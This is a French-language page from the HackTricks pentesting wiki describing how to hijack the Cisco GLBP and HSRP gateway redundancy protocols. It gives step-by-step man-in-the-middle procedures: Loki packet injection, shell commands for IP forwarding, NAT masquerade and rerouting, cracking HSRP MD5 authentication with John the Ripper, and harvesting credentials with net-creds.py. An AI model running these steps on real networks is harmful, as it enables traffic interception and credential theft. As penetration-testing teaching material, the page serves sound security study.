# Attaques GLBP & HSRP

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Aper√ßu du d√©tournement FHRP

### Aper√ßu de FHRP
FHRP est con√ßu pour fournir une robustesse r√©seau en fusionnant plusieurs routeurs en une seule unit√© virtuelle, am√©liorant ainsi la distribution de charge et la tol√©rance aux pannes. Cisco Systems a introduit des protocoles importants dans cette suite, tels que GLBP et HSRP.

### Aper√ßu du protocole GLBP
La cr√©ation de Cisco, GLBP, fonctionne sur la pile TCP/IP, utilisant UDP sur le port 3222 pour la communication. Les routeurs dans un groupe GLBP √©changent des paquets "hello" √† des intervalles de 3 secondes. Si un routeur ne parvient pas √† envoyer ces paquets pendant 10 secondes, il est pr√©sum√© hors ligne. Cependant, ces minuteries ne sont pas fixes et peuvent √™tre modifi√©es.

### Op√©rations GLBP et distribution de charge
GLBP se distingue en permettant la distribution de charge entre les routeurs √† l'aide d'une seule adresse IP virtuelle coupl√©e √† plusieurs adresses MAC virtuelles. Dans un groupe GLBP, chaque routeur participe √† la transmission de paquets. Contrairement √† HSRP/VRRP, GLBP offre un v√©ritable √©quilibrage de charge gr√¢ce √† plusieurs m√©canismes :

- **√âquilibrage de charge d√©pendant de l'h√¥te :** Maintient l'attribution d'adresse MAC AVF coh√©rente √† un h√¥te, essentiel pour des configurations NAT stables.
- **√âquilibrage de charge en round-robin :** L'approche par d√©faut, alternant l'attribution d'adresse MAC AVF parmi les h√¥tes demandeurs.
- **√âquilibrage de charge pond√©r√© en round-robin :** Distribue la charge en fonction de m√©triques de "Poids" pr√©d√©finies.

### Composants cl√©s et terminologies dans GLBP
- **AVG (Passerelle virtuelle active) :** Le routeur principal, responsable de l'attribution des adresses MAC aux routeurs pairs.
- **AVF (Transmetteur virtuel actif) :** Un routeur d√©sign√© pour g√©rer le trafic r√©seau.
- **Priorit√© GLBP :** Une m√©trique qui d√©termine l'AVG, commen√ßant par une valeur par d√©faut de 100 et allant de 1 √† 255.
- **Poids GLBP :** Refl√®te la charge actuelle sur un routeur, ajustable manuellement ou via le suivi d'objets.
- **Adresse IP virtuelle GLBP :** Sert de passerelle par d√©faut du r√©seau pour tous les appareils connect√©s.

Pour les interactions, GLBP utilise l'adresse multicast r√©serv√©e 224.0.0.102 et le port UDP 3222. Les routeurs transmettent des paquets "hello" √† des intervalles de 3 secondes et sont consid√©r√©s comme non op√©rationnels si un paquet est manqu√© pendant une dur√©e de 10 secondes.

### M√©canisme d'attaque GLBP
Un attaquant peut devenir le routeur principal en envoyant un paquet GLBP avec la valeur de priorit√© la plus √©lev√©e (255). Cela peut entra√Æner des attaques de d√©ni de service ou de l'homme du milieu, permettant l'interception ou la redirection du trafic.

### Ex√©cution d'une attaque GLBP avec Loki
[Loki](https://github.com/raizo62/loki_on_kali) peut effectuer une attaque GLBP en injectant un paquet avec une priorit√© et un poids d√©finis √† 255. Les √©tapes pr√©alables √† l'attaque consistent √† recueillir des informations telles que l'adresse IP virtuelle, la pr√©sence d'authentification et les valeurs de priorit√© du routeur en utilisant des outils comme Wireshark.

√âtapes de l'attaque :
1. Passer en mode promiscuit√© et activer le transfert IP.
2. Identifier le routeur cible et r√©cup√©rer son IP.
3. G√©n√©rer une ARP gratuit.
4. Injecter un paquet GLBP malveillant, en se faisant passer pour l'AVG.
5. Attribuer une adresse IP secondaire √† l'interface r√©seau de l'attaquant, refl√©tant l'adresse IP virtuelle GLBP.
6. Mettre en ≈ìuvre SNAT pour une visibilit√© totale du trafic.
7. Ajuster le routage pour garantir un acc√®s Internet continu via le routeur AVG d'origine.

En suivant ces √©tapes, l'attaquant se positionne en tant que "homme du milieu", capable d'intercepter et d'analyser le trafic r√©seau, y compris les donn√©es non chiffr√©es ou sensibles.

Pour une d√©monstration, voici les extraits de commandes requis :
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Explication passive du d√©tournement de HSRP avec d√©tails de commande

#### Aper√ßu de HSRP (Hot Standby Router/Redundancy Protocol)
HSRP est un protocole propri√©taire de Cisco con√ßu pour la redondance de passerelle r√©seau. Il permet la configuration de plusieurs routeurs physiques en une seule unit√© logique avec une adresse IP partag√©e. Cette unit√© logique est g√©r√©e par un routeur principal responsable de la direction du trafic. Contrairement √† GLBP, qui utilise des m√©triques comme la priorit√© et le poids pour l'√©quilibrage de charge, HSRP repose sur un seul routeur actif pour la gestion du trafic.

#### R√¥les et Terminologie dans HSRP
- **Routeur Actif HSRP**: Le dispositif agissant en tant que passerelle, g√©rant le flux de trafic.
- **Routeur Standby HSRP**: Un routeur de secours, pr√™t √† prendre le relais si le routeur actif √©choue.
- **Groupe HSRP**: Un ensemble de routeurs collaborant pour former un seul routeur virtuel r√©silient.
- **Adresse MAC HSRP**: Une adresse MAC virtuelle attribu√©e au routeur logique dans la configuration HSRP.
- **Adresse IP Virtuelle HSRP**: L'adresse IP virtuelle du groupe HSRP, agissant en tant que passerelle par d√©faut pour les appareils connect√©s.

#### Versions de HSRP
HSRP existe en deux versions, HSRPv1 et HSRPv2, diff√©rant principalement en capacit√© de groupe, utilisation d'IP multicast et structure d'adresse MAC virtuelle. Le protocole utilise des adresses IP multicast sp√©cifiques pour l'√©change d'informations de service, avec des paquets Hello envoy√©s toutes les 3 secondes. Un routeur est consid√©r√© comme inactif s'il ne re√ßoit aucun paquet dans un intervalle de 10 secondes.

#### M√©canisme d'attaque HSRP
Les attaques HSRP impliquent de prendre de force le r√¥le du Routeur Actif en injectant une valeur de priorit√© maximale. Cela peut entra√Æner une attaque de l'Homme du Milieu (MITM). Les √©tapes pr√©alables essentielles √† l'attaque incluent la collecte de donn√©es sur la configuration HSRP, ce qui peut √™tre fait en utilisant Wireshark pour l'analyse du trafic.

#### √âtapes pour contourner l'authentification HSRP
1. Enregistrer le trafic r√©seau contenant les donn√©es HSRP dans un fichier .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraire les hachages MD5 du fichier .pcap en utilisant hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Casser les hachages MD5 en utilisant John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ex√©cution de l'injection HSRP avec Loki**

1. Lancer Loki pour identifier les annonces HSRP.
2. D√©finir l'interface r√©seau en mode promiscuit√© et activer le transfert IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utiliser Loki pour cibler le routeur sp√©cifique, entrer le mot de passe HSRP cass√© et effectuer les configurations n√©cessaires pour se faire passer pour le Routeur Actif.
4. Apr√®s avoir obtenu le r√¥le de Routeur Actif, configurer votre interface r√©seau et les tables IP pour intercepter le trafic l√©gitime.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifier la table de routage pour router le trafic √† travers l'ancien Routeur Actif.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utiliser net-creds.py ou un utilitaire similaire pour capturer les informations d'identification du trafic intercept√©.
```shell
sudo python2 net-creds.py -i eth0
```

L'ex√©cution de ces √©tapes place l'attaquant dans une position pour intercepter et manipuler le trafic, similaire √† la proc√©dure de d√©tournement de GLBP. Cela met en √©vidence la vuln√©rabilit√© des protocoles de redondance comme HSRP et la n√©cessit√© de mesures de s√©curit√© robustes.
